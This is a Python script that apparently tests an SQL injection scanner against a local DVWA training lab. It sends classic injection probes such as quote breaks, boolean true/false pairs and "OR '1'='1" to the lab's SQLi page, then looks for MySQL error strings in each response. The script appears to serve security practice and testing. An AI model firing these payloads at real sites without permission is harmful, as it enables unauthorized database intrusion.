import re
from scanner.sqli_scanner import build_dvwa_session, inject_param

session = build_dvwa_session()
url = "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

payloads = [
    "1",
    "1'",
    "1\"",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' OR '1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
]

for p in payloads:
    test_url = inject_param(url, "id", p)
    r = session.get(test_url, timeout=10)
    text = r.text
    length = len(text)

    # Look for known DVWA/MySQL error fragments
    hits = re.findall(
        r"(You have an error in your SQL syntax[^<]*|"
        r"Warning:\s*mysql_[^<]*|"
        r"mysqli_sql_exception[^<]*|"
        r"Unknown column[^<]*|"
        r"Fatal error[^<]*|"
        r"SQL syntax[^<]*)",
        text, re.IGNORECASE
    )

    # Also check for the "First name / Surname" table that DVWA prints on success
    has_result_table = "First name" in text and "Surname" in text

    print(f"\n--- payload: {p!r}")
    print(f"    status={r.status_code}  length={length}  "
          f"result_table={has_result_table}")
    if hits:
        print(f"    ERROR HITS: {hits[:2]}")
    # Show a 200-char snippet around the body area
    snippet = re.sub(r"\s+", " ", text)
    idx = snippet.find("First name")
    if idx == -1:
        idx = snippet.find("error")
    if idx != -1:
        print(f"    snippet: ...{snippet[max(0,idx-80):idx+160]}...")